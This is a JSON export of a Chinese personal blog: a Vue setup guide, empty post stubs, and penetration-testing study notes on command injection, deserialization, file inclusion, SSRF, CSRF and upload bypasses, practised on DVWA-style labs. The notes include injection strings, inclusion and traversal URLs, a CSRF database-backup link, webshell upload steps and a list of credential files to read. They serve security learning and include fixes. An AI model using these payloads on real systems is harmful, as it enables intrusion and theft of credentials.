[{"title":"vue搭建","date":"2020-09-15T11:17:37.000Z","path":"2020/09/15/vue搭建/","text":"1. 避坑前言确认node与npm的版本 将这个放在最前面说是希望大家在搭建前，应该先确保将node更新至6以上，这样能少走一些弯路。下面开始正式介绍整个构建过程。 2. 使用 vue-cli 搭建项目下面整个过程是基于已经安装node.js和cnpm的基础上，node.js如何安装就不在这里详说了。如何全局化安装cnpm，这里简单提一下： 1npm install cnpm -g --registry&#x3D;https:&#x2F;&#x2F;registry.npm.taobao.org 其实对于安装vue-cli，使用npm命令和cnpm命令都是可以的，个人觉得使用npm安装的比较慢，而且很可能会因为网络问题而出错，所以还是觉得使用cnpm稳一点。 （1）全局安装 vue-cli ，在命令提示窗口执行：1cnpm install -g vue-cli 安装vue-cli 出现以上提示表示vue-cli正常安装成功，可以正式创建vue-cli工程项目了。 （2）安装vue-cli成功后，通过cd命令进入你想放置项目的文件夹，在命令提示窗口执行创建vue-cli工程项目的命令：1vue init webpack 创建vue-cli工程项目 确认创建项目后，后续还需输入一下项目名称、项目描述、作者、打包方式、是否使用ESLint规范代码等等， 生成文件目录 （3）生成文件目录后，使用 cnpm 安装依赖：1cnpm install 安装依赖 （4）最后需要执行命令： npm run dev 来启动项目，启动完成后会自动弹出默认网页：到这一步，就算成功利用vue-cli搭建一个vue项目了，撒花 ~ 3.目录结构及其对应作用通过vue-cli搭建一个vue项目，会自动生成一系列文件，而这些文件具体是怎样的结构、文件对应起什么作用，可以看看下面的解释： 12345678910111213141516171819202122232425262728293031├── build&#x2F; # webpack 编译任务配置文件: 开发环境与生产环境│ └── ...├── config&#x2F; │ ├── index.js # 项目核心配置│ └── ...├ ── node_module&#x2F; #项目中安装的依赖模块 ── src&#x2F;│ ├── main.js # 程序入口文件│ ├── App.vue # 程序入口vue组件│ ├── components&#x2F; # 组件│ │ └── ...│ └── assets&#x2F; # 资源文件夹，一般放一些静态资源文件│ └── ...├── static&#x2F; # 纯静态资源 (直接拷贝到dist&#x2F;static&#x2F;里面)├── test&#x2F;│ └── unit&#x2F; # 单元测试│ │ ├── specs&#x2F; # 测试规范│ │ ├── index.js # 测试入口文件│ │ └── karma.conf.js # 测试运行配置文件│ └── e2e&#x2F; # 端到端测试│ │ ├── specs&#x2F; # 测试规范│ │ ├── custom-assertions&#x2F; # 端到端测试自定义断言│ │ ├── runner.js # 运行测试的脚本│ │ └── nightwatch.conf.js # 运行测试的配置文件├── .babelrc # babel 配置文件├── .editorconfig # 编辑配置文件├── .gitignore # 用来过滤一些版本控制的文件，比如node_modules文件夹 ├── index.html # index.html 入口模板文件└── package.json # 项目文件，记载着一些命令和依赖还有简要的项目描述信息 └── README.md #介绍自己这个项目的，可参照github上star多的项目。build&#x2F;","tags":[{"name":"前端","slug":"前端","permalink":"https://zhangyanlady.github.io/tags/%E5%89%8D%E7%AB%AF/"},{"name":"vue","slug":"vue","permalink":"https://zhangyanlady.github.io/tags/vue/"}]},{"title":"越权、逻辑漏洞","date":"2020-09-12T12:07:08.000Z","path":"2020/09/12/越权、逻辑漏洞/","text":"","tags":[]},{"title":"脚本后门分析","date":"2020-09-12T12:06:58.000Z","path":"2020/09/12/脚本后门分析/","text":"","tags":[]},{"title":"暴力破解","date":"2020-09-12T12:06:48.000Z","path":"2020/09/12/暴力破解/","text":"","tags":[]},{"title":"中间人攻击","date":"2020-09-12T12:06:31.000Z","path":"2020/09/12/中间人攻击/","text":"","tags":[]},{"title":"内网渗透","date":"2020-09-12T12:06:21.000Z","path":"2020/09/12/内网渗透/","text":"","tags":[]},{"title":"waf绕过","date":"2020-09-12T12:06:04.000Z","path":"2020/09/12/waf绕过/","text":"","tags":[]},{"title":"社工、APT","date":"2020-09-12T12:05:45.000Z","path":"2020/09/12/社工、APT/","text":"","tags":[]},{"title":"旁注、目录越权、跨库、CDN绕过","date":"2020-09-12T12:05:33.000Z","path":"2020/09/12/旁注、目录越权、跨库、CDN绕过/","text":"","tags":[]},{"title":"编辑器漏洞","date":"2020-09-12T12:05:25.000Z","path":"2020/09/12/编辑器漏洞/","text":"","tags":[]},{"title":"XXE","date":"2020-09-12T12:05:18.000Z","path":"2020/09/12/XXE/","text":"","tags":[]},{"title":"代码执行与反序列化","date":"2020-09-12T12:05:09.000Z","path":"2020/09/12/代码执行与反序列化/","text":"总结图 远程命令执行原理：应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上 一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。而如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。 远程代码执行漏洞原理：为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。 ​ 因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。 php执行系统及代码命令常用函数1）执行系统命令: assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,``(反单引号） PHP执行系统命令的有几个常用的函数,如有:system函数、exec函数、popen函数,passthru,shell_exec函数他们都可以执行系统命令,不过前提时必须系统给了权限了哦。 system函数 说明：执行外部程序并显示输出资料。 语法：string system(string command, int [return_var]); 返回值: 字符串详细介绍：本函数就像是 C 语中的函数 system(),用来执行指令,并输出结果,若是 return_var 参数存在,则执行 command 之后的状态会填入 return_var 中,同样值得注意的是若需要处理用户输入的资料,而又要防止用户耍花招破解系统,则可以使用 EscapeShellCmd(),若 PHP 以模块式的执行,本函数会在每一行输出后自动更新 Web 服务器的输出缓冲暂存区,若需要完整的返回字符串,且不想经过不必要的其它中间的输出界面,可以使用 PassThru()。 exec函数 说明：执行外部程序。 语法：string exec(string command, string [array], int [return_var]); 返回值: 字符串 详细介绍：本函数执行输入 command 的外部程序或外部指令。它的返回字符串只是外部程序执行后返回的最后一行；若需要完整的返回字符串，可以使用PassThru() 这个函数。 要是参数 array 存在，command 会将 array 加到参数中执行，若不欲 array 被处理，可以在执行 exec() 之前呼叫 unset()。若是 return_var 跟 array 二个参数都存在，则执行 command 之后的状态会填入 return_var 中。 值得注意的是若需要处理使用者输入的资料，而又要防止使用者耍花招破解系统，则可以使用EscapeShellCmd() popen函数 说明：打开文件。 语法：int popen(string command, string mode); 返回值: 整数 详细介绍：本函数执行指令开档，而该文件是用管道方式处理的文件。用本函数打开的文件只能是单向的(只能读或只能写)，而且一定要用pclose() 关闭。在文件操作上可使用 fgets()、fgetss() 与 fputs()。若是开档发生错误，返回 false 值。 反撇号`（和~在同一个键）执行系统外部命令, 代码如下:echo dir; 知识点：在使用这种方法执行系统外部命令时，你要确保shell_exec函数可用，否则是无法使用这种反撇号执行系统外部命令的。 安全性说明:当你使用这些函数执行命令时，如果是根据用户提交数据作为执行命令的话，你需要考虑系统安全性，可以使用escapeshellcmd()和escapeshellarg()函数阻止用户恶意在系统上执行命令，escapeshellcmd()针对的是执行的系统命令，而escapeshellarg()针对的是执行系统命令的参数。这两个参数有点类似addslashes()的功能。 完成dvwa三个级别实验Low级别 当dvwa级别为low时可以看源代码没做过滤 我们便可以通过加&amp;&amp;、；、|、等符号入侵（当有&amp;&amp;时前面ip必须为真‘否则后面的命令不会执行当自有&amp;时前面ip为假那么命令便会在web存在的服务器执行） 我们便可以通过127.0.0.1&amp;&amp;ipconfig（各种命令）来执行命令 Medium级别 当在medium级别时我们可以看源代码将&amp;&amp;、；、过滤了 这时我们可以使用添加&amp;加空格或&amp;;&amp; 进行入侵 High级别 在high级别时我们可以看到源代码对以下做了过滤 此时我们可以添加|| （代码里面的|后有一个空格）进行入侵 Impossible级别的代码加入了Anti-CSRF token，同时对参数ip进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。 struts2 048、045、052、057实验参考文章： https://blog.csdn.net/weixin_43625577/article/details/97111575 https://www.sinesafe.com/article/20180823/struts2057.html Struts2 045实验使用k8工具 执行添加账号命令 上传木马小马 链接小马上传大马 Struts2 048实验使用方法struts2_S2-048.py Struts2 052实验参考https://www.cnblogs.com/Hi-blog/p/7510987.html 针对版本Ubuntu 16.04 、Apache/2.4.18、Struts2.5 – Struts2.5.12版本。：struts2-rest-showcase因为我的版本无漏洞就先把操作过程如下 反序列化就是把一个对象变成可以传输的字符串，目的就是为了方便传输。假设，我们写了一个class，这个class里面存有一些变量。当这个class被实例化了之后，在使用过程中里面的一些变量值发生了改变。以后在某些时候还会用到这个变量，如果我们让这个class一直不销毁，等着下一次要用它的时候再一次被调用的话，浪费系统资源。当我们写一个小型的项目可能没有太大的影响，但是随着项目的壮大，一些小问题被放大了之后就会产生很多麻烦。这个时候PHP就和我们说，你可以把这个对象序列化了，存成一个字符串，当你要用的时候再放他出来就好了。在我们讲PHP反序列化的时候，基本都是围绕着serialize()，unserialize()这两个函数。 详细参考： https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/ 原理serialize()和 unserialize() 在 PHP内部实现上是没有漏洞的，之所以会产生反序列化漏洞是因为应用程序在处理对象、魔术函数以及序列化相关问题的时候导致的。 当传给 unserialize() 的参数可控时，那么用户就可以注入精心构造的 payload。当进行反序列化的时候就有可能会触发对象中的一些魔术方法，造成意想不到的危害。 完成反序列化pikachu实试在线反序列化工具：https://www.w3cschool.cn/tools/index?name=unserialize 输入payload：O:1:”S”:1:{s:4:”test”;s:29:”alert(‘xss’)”;}","tags":[{"name":"网络安全","slug":"网络安全","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"文件包含","date":"2020-09-12T12:04:50.000Z","path":"2020/09/12/文件包含/","text":"总结图 本地包含使用include文件 代码表示上传的文件都以php执行 远程包含需要把allow_url_include=on，magic_quotes_gpc=off 包含日志文件 当某个PHP文件存在本地包含漏洞，而却无法上传正常文件，这就意味这有包含漏洞却不能拿来利用，这时攻击者就有可能会利用apache日志文件来入侵。 Apache服务器运行后会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，apache的日志文件记录下我们的操作，并且写到访问日志文件access.log之中 开启apache日志方法打开配置文件-httpd-conf，打开httpd.conf配置文件， 第299行： \\1. ##CustomLog “logs/access.log” common 去掉前边的 # ，并重启apache。 写入一句话木马 PHP包含写文件构造URL: http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://input, 并且提交post数据为: ​ 注意:只有在allow _url_include为on的时候才可以使用,如果想查看回显结果那必须在C:\\php\\php-5.2.14-Win32下找到php-apache2handler.ini打开，查找display_funtions=proc-open,oppen,exec,system…….删掉system重启apache。 PHP包含读文件http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=x.php 访问URL,得到经过base64加密后的字符串: 包含截断绕过 这种方法只适合于magic_quotes_gpc=off的时候， php版本小于5.3.4，可通过%00截断绕过，不过现在已经很难见到了，比如：index.php?file=info.txt//////////////…………超过一定数据的/。 str_replace、fnmatch涵数绕过str_replace函数绕过:使用str_replace函数是极其不安全的，因为可以使用双写绕过替换规则。 例如page=hthttp://tp://192.168.0.103/phpinfo.txt时，str_replace函数会将http://删除，于是page=http://192.168.0.103/phpinfo.txt，成功执行远程命令。 同时，因为替换的只是“../”、“..\\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。 1、本地文件包含 http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=…/./777.jpg 2、绝对路径不受任何影响http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=c:/2.txt 3、远程文件包含:http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=htthttp://p://192.168.0.106:8080/index.php fnmatch函数绕过if(!fnmatch(“file*”,$file)&amp;&amp;$file!=”include.php”),当文件既不是”include.php”也不是”file*”（文件名file开头）时才抛出错误，反之意思，如果文件名符合其中一个条件既可以。page=file:///C:/xampp/htdocs/dvwa/php.ini 刚好满足”file*”（文件名file开头）。 http://192.168.0.113:82/dvwa/vulnerabilities/fi/?page=file:///C:/2.txt php内置协议 File:// 访问本地文件系统 htt[p:// 访问HTTP(s)网址 ftp:// 访问FTP(s)URLS php:// 访问各个输入/输出流(I/o streams) zlib:// 压缩流 data:// 数据(RFC2397) ssh2:// Secure Shell 2 expect:// 处理交互式的流 glob:// 查找匹配的文件路径模式","tags":[{"name":"网络安全","slug":"网络安全","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"SSRF服务端请求伪造","date":"2020-09-12T12:04:42.000Z","path":"2020/09/12/SSRF服务端请求伪造/","text":"总结图 定义： 服务器端请求伪造：是一种由攻击者构造形成，由服务端发起请求的一个安全漏洞。一般情况下，ssrf是要目标网站的内部系统，因为他是从内部系统访问的，所有可能通过它攻击外网无法访问的内部系统，也就是说把目标网站当中间人 形成原因： 大都是由于服务器提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤和限制 比如从指定url获取网页文本内容，加载指定网站的图片，文档等 漏洞的挖掘：1、通过web功能寻找1）分享：通过URL地址分享网页内容 2）转码服务 3）在线翻译 4）图片加载与下载：通过URL地址加载或下载图片 5）图片、文章收藏功能 6）未公开的api实现以及其他调用URL的功能 2、通过url关键字寻找share wap url link src source target u 3g display sourceURl imageURL domain 3、通过扫描器工具寻找绕过方法： 更改ip地址写法：转换进制 利用解析url出现的问题 httP://www.oldboyedu.com@192.168.0.1/ 不正确的正则匹配：http之后到com之前 利用协议 防范（黑名单） （1）过滤10.0.0.0/8、172.16.0.0/12、192.168.0.0/16、localhost私有地址、IPv6地址 （2）过滤file:///、dict://、gopher://、ftp:// 危险schema （3）对返回的内容进行识别 （4）内网服务开启鉴权（Memcached, Redis, Elasticsearch and MongoDB）","tags":[{"name":"网络安全","slug":"网络安全","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"CSRF跨站请求伪造","date":"2020-09-12T12:04:27.000Z","path":"2020/09/12/CSRF跨站请求伪造/","text":"总结图 1、用自己的语言描述csrf攻击原理当用户登录某个网站时，产生会话，然后去点击带有csrf攻击程序的web，CSRF攻击利用网站对于用户网页浏览器的信任，挟持用户当前已登陆的Web应用程序，去执行并非用户本意的操作。 2、csrf攻击分类CSRF漏洞一般分为站外和站内两种类型。 CSRF站外类型的漏洞本质上就是传统意义上的外部提交数据问题。通常程序员会考虑给一些留言或者评论的表单加上水印以防止SPAM问题（这里，SPAM可以简单的理解为垃圾留言、垃圾评论，或者是带有站外链接的恶意回复），但是有时为了提高用户的体验性，可能没有对一些操作做任何限制，所以攻击者可以事先预测并设置请求的参数，在站外的Web页面里编写脚本伪造文件请求，或者和自动提交的表单一起使用来实现GET、POST请求，当用户在会话状态下点击链接访问站外Web页面，客户端就被强迫发起请求。 CSRF站内类型的漏洞在一定程度上是由于程序员滥用$_REQUEST类变量造成的。在一些敏感的操作中（如修改密码、添加用户等），本来要求用户从表单提交发起POST请求传递参数给程序，但是由于使用了$_REQUEST等变量，程序除支持接收POST请求传递的参数外也支持接收GET请求传递的参数，这样就会为攻击者使用CSRF攻击创造条件。一般攻击者只要把预测的请求参数放在站内一个贴子或者留言的图片链接里，受害者浏览了这样的页面就会被强迫发起这些请求。 3、csrf漏洞检测方法。1、抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞 2、扫描器扫描，但误报较高，后台登录，修改密码等可能扫不出csrf漏洞 4、完成csrf脱库、添加帐号、更新密码实验Csrf脱库：一般xiaz开源代码去观看路径一般不会改变；一级目录可以在url中看到 在搭建好的DZ注册普通，然后发帖，插入远程图片，URL为： http://192.168.0.106:8080/dzcrst/uc_server/admin.php?m=db&amp;a=operate&amp;t=export&amp;appid=0&amp;backupdir=xxxx%26backupfilename%3Daaaa 此链接为数据库备份操作 然后管理员点进去便会执行可以写一些吸引管理员的文字 此时，我们可以访问默认备份路径及我们重命名的文件夹和文件名：http://192.168.1.224:8082/dzcsrt/uc_server/data/backup/xxxx/aaaa-1.sql 添加帐号： 修改密码： 当我们登录DVWA后，在CSRF中： LOW级别时：直接修改密码即可。 medium级别时：Referer得为网站修改页面的路径。否则会修改失败 5、csrf防范方法目前业界服务器端防御CSRF攻击主要有5种策略： 1验证HTTP Referer字段（可以突破） 根据HTTP协议，在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。在通常情况下，访问一个安全受限页面的请求必须来自于同一个网站。 2、在请求地址中添加token并验证 在请求中放入攻击者所不能伪造的信息，并且该信息不存在于Cookie之中。鉴于此，系统开发者可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。 3、在HTTP头中自定义属性并验证 自定义属性的方法也是使用token并进行验证，和前一种方法不同的是，这里并不是把token以参数的形式置于HTTP请求之中，而是把它放到HTTP头中自定义的属性里。通过XMLHttpRequest这个类，可以一次性给所有该类请求加上csrftoken这个HTTP头属性，并把token值放入其中。这样解决了前一种方法在请求中加入token的不便，同时，通过这个类请求的地址不会被记录到浏览器的地址栏，也不用担心token会通过Referer泄露到其他网站。 4、在服务端区严格区分好POST与GET的数据请求 如在asp中不要使用Request来直接获取数据。同时建议不要用GET请求来执行持久性操作，如：http://www.yeeyan.com/space/deleteEvent/16824。 5、使用验证码或者密码确认方式进行 6、用户端防御 用户养成良好的上网习惯，则能够很大程度上减少CSRF攻击的危害 7、安全设备防御 用户可以借助第三方的专业安","tags":[{"name":"网络安全","slug":"网络安全","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"文件上传、下载","date":"2020-09-12T12:04:15.000Z","path":"2020/09/12/文件上传、下载/","text":"总结图 文件下载一、漏洞介绍 一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞。 二、利用方式一般链接形式:download.php?path=down.php?file=data.php?file= 或者包含参数:&amp;Src=&amp;Inputfile=&amp;Filepath=&amp;Path=&amp;Data= 三、利用思路:(1)下载常规的配置文件，例如: ssh,weblogic,ftp,mysql等相关配置 (2)下载各种.log文件，从中寻找一些后台地址，文件上传点之类的地方，如果运气好的话会获得一些前辈们的后门。 (3)下载web业务文件进行白盒审计，利用漏洞进一步攻入服务器。 尝试读取/root/.bash_history看自己是否具有root权限。如果没有的话。我们只能按部就班的利用../来回跳转读取一些.ssh下的配置信息文件，读取mysql下的.bash_history文件。来查看是否记录了一些可以利用的相关信息。然后逐个下载我们需要审计的代码文件，但是下载的时候变得很繁琐，我们只能尝试去猜解目录，然后下载一些中间件的记录日志进行分析。 如果我们遇到的是java+oracle环境 可以先下载/WEB-INF/classes/applicationContext.xml 文件，这里面记载的是web服务器的相应配置，然后下载/WEB-INF/classes/xxx/xxx/ccc.class对文件进行反编译，然后搜索文件中的upload关键字看是否存在一些api接口，如果存在的话我们可以本地构造上传页面用api接口将我们的文件传输进服务器 如果具有root权限 在linux中有这样一个命令 locate 是用来查找文件或目录的，它不搜索具体目录，而是搜索一个数据库/var/lib/mlocate/mlocate.db。这个数据库中含有本地所有文件信息。Linux系统自动创建这个数据库，并且每天自动更新一次。当我们不知道路径是什么的情况下，这个可以说是一个核武器了，我们利用任意文件下载漏洞mlocate.db文件下载下来，利用locate命令将数据输出成文件，这里面包含了全部的文件路径信息。 locate 读取方法: locate mlocate.db admin //可以将mlocate.db中包含admin文件名的内容全部输出来 （4）常见利用文件/root/.ssh/authorized_keys/root/.ssh/id_rsa/root/.ssh/id_ras.keystore/root/.ssh/known_hosts //记录每个访问计算机用户的公钥/etc/passwd/etc/shadow/etc/my.cnf //mysql配置文件/etc/httpd/conf/httpd.conf //apache配置文件/root/.bash_history //用户历史命令记录文件/root/.mysql_history //mysql历史命令记录文件/proc/mounts //记录系统挂载设备/porc/config.gz //内核配置文件/var/lib/mlocate/mlocate.db //全文件路径/porc/self/cmdline //当前进程的cmdline参数 四、漏洞修复（1）过滤”.”，使用户在url中不能回溯上级目录 （2）正则严格判断用户输入参数的格式 （3）php.ini配置open_basedir限定文件访问范围 文件上传流程 一、客户端检测绕过(javascript 检测)​ 首先观察到提示只允许上传图片文件，那么前端的查看代码，当页面发生改变时，会调用这个checkFileExt函数来检查上传的是不是图片，我们只需要在前端将checkFileExt函数删除，就能上传一个一个非图片文件。 文件上传客户端： 将checkFileExt(this.value)函数删除便可上传任意文件 或者通过burp抓包将之前改为符合类型的文件在改回来 二、服务端验证绕过(MIME 类型检测)​ MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。 ​ 每个MIME类型由两部分组成，前面是数据的大类别，例如声音audio、图象image等，后面定义具体的种类。 常见的MIME类型(通用型)： 超文本标记语言文本 .html text/html xml文档 .xml text/xml XHTML文档 .xhtml application/xhtml+xml 普通文本 .txt text/plain RTF文本 .rtf application/rtf PDF文档 .pdf application/pdf Microsoft Word文件 .word application/msword PNG图像 .png image/png GIF图形 .gif image/gif JPEG图形 .jpeg,.jpg image/jpeg au声音文件 .au audio/basic MIDI音乐文件 mid,.midi audio/midi,audio/x-midi RealAudio音乐文件 .ra, .ram audio/x-pn-realaudio MPEG文件 .mpg,.mpeg video/mpeg AVI文件 .avi video/x-msvideo GZIP文件 .gz application/x-gzip TAR文件 .tar application/x-tar 任意的二进制数据 application/octet-stream 通过使用 PHP 的全局数组 $_FILES，你可以从客户计算机向远程服务器上传文件。 第一个参数是表单的 input name，第二个下标可以是 “name”, “type”, “size”, “tmp_name” 或 “error”。就像这样： $_FILES[&quot;file&quot;][&quot;name&quot;] 被上传文件的名称 $_FILES[&quot;file&quot;][&quot;type&quot;] 被上传文件的类型 $_FILES[&quot;file&quot;][&quot;size&quot;] 被上传文件的大小，以字节计 $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] 存储在服务器的文件的临时副本的名称 $_FILES[&quot;file&quot;][&quot;error&quot;] 由文件上传导致的错误代码 详细可参考：http://www.w3school.com.cn/php/php_file_upload.asp ​ 分析代码逻辑：首先会获取到前端的提交请求，然后定义了一个数组（定义图片上传指定类型），然后通过upload_sick函数对上传的文件进行一定的检查。 分析upload_sick函数（定义在uploadfunction.php文件里面）存在漏洞的的原因是因为 $ _FILES() 这个全局的方法是通过浏览器http头去获取的content-type，content-type是前端用户可以控制的。容易被绕过。 ​ 上传一张正常的符合标准的图片，对其content-type进行抓包操作。可见正常上传符合要求的图片中数据包中content-type为image/png对比符合条件，而php文件则不符合条件返回文件类型错误。 三、代码注入绕过–getimagesize()​ getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息，如果用这个涵数来获取类型，从而判断是否是图片的话，会存在问题。 语法格式： array getimagesize ( string $filename [, array &amp;$imageinfo ] ) getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。 文件包含漏洞之文件上传漏洞利用 方法一：直接伪造头部GIF89A 方法二：CMD方法，copy /b test.png+1.php muma.png 方法三：直接使用工具增加备注写入一句话木马。 四、路径/扩展名绕过1、白名单 0x00截断或test.asp%00.jpg MIME绕过 2、黑名单 （1）文件名大小写绕过 （2）名单绕过 ​ 用黑名单里没有的名单进行攻击，比如黑名单里没有.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess后缀文件之类 （3）特殊文件名或文件夹绕过(windows) ​ 还有比如发送的http 包里把文件名改成test.asp. 或test.asp_(下划线为空格)，这种命名方式在windows 系统里是不被允许的，所以需要在burp 之类里进行修改，然后绕过验证后，会被windows 系统自动去掉后面的点和空格，但要注意Unix/Linux 系统没有这个特性。 （4）0x00截断%00和0x0a name = getname(http request) //假如这时候获取到的文件名是test.asp .jpg(asp 后面为0x00) type = gettype(name) //而在gettype()函数里处理方式是从后往前扫描扩展名，所以判断为jpg if (type == jpg) SaveFileToPath(UploadPath.name, name) //但在这里却是以0x00 作为文件名截断 ​ //最后以test.asp 存入路径里 （5）把文件名改成test.asp. 或test.asp_(下划线为空格)，这种命名方式在windows 系统里是不被允许的，所以需要在burp 之类里进行修改，然后绕过验证后，会被windows 系统自动去掉后面的点和空格，但要注意Unix/Linux 系统没有这个特性。 （6）双后缀名绕过 （7）::$DATA绕过 ​ 是Windows下NTFS文件系统的一个特性，即NTFS文件系统的存储数据流的一个属性 DATA 时，就是请求 a.asp 本身的数据，如果a.asp 还包含了其他的数据流，比如 a.asp:lake2.asp，请求 a.asp:lake2.asp::$DATA，则是请求a.asp中的流数据lake2.asp的流数据内容。 五、中间件解析漏洞绕过总结图 IIS解析漏洞（一）IIS5.x-6.x解析漏洞使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。 目录解析(6.0) 形式：www.xxx.com/xx.asp/xx.jpg原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。 文件解析 形式：www.xxx.com/xx.asp;.jpg原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。 解析文件类型 IIS6.0 默认的可执行文件除了asp还包含这三种 : /test.asa/test.cer/test.cdx 修复方案 1.目前尚无微软官方的补丁，可以通过自己编写正则，阻止上传xx.asp;.jpg类型的文件名。2.做好权限设置，限制用户创建文件夹。 （二）IIS7.x解析漏洞需要把请求限制的 对勾 给去掉，才会有解析漏洞192.168.0.106:8089/1.jpg/.php,这样去构造。 Apache解析漏洞漏洞原理 Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把oldboy.php.owf.rar解析成php。 漏洞形式 www.xxxx.xxx.com/test.php.php123 其余配置问题导致漏洞 （1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。（2）如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。 修复方案 1.apache配置文件，禁止.php.这样的文件执行，配置文件里面加入 1234&lt;Files ~ “.(php.|php3.)”&gt; Order Allow,Deny Deny from all&lt;&#x2F;Files&gt; 2.用伪静态能解决这个问题，重写类似.php.*这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules/mod_rewrite.so把#号去掉，重启apache,在网站根目录下建立.htaccess文件 代码： 123456789101112131415&lt;IfModule mod_rewrite.c&gt;RewriteEngine OnRewriteRule .(php.|php3.) &#x2F;index.phpRewriteRule .(pHp.|pHp3.) &#x2F;index.phpRewriteRule .(phP.|phP3.) &#x2F;index.phpRewriteRule .(Php.|Php3.) &#x2F;index.phpRewriteRule .(PHp.|PHp3.) &#x2F;index.phpRewriteRule .(PhP.|PhP3.) &#x2F;index.phpRewriteRule .(pHP.|pHP3.) &#x2F;index.phpRewriteRule .(PHP.|PHP3.) &#x2F;index.php&lt;&#x2F;IfModule&gt;.htaccess 配置文件LoadModule rewrite_module modules&#x2F;mod_rewrite.so前的注释去掉，寻找关键词：AllowOverride，并把后面的参数从None全部改成All Nginx解析漏洞漏洞原理 Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑： PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了 漏洞形式 www.xxxx.com/UploadFiles/image/1.jpg/1.phpwww.xxxx.com/UploadFiles/image/1.jpg%00.phpwww.xxxx.com/UploadFiles/image/1.jpg/%20\\0.php 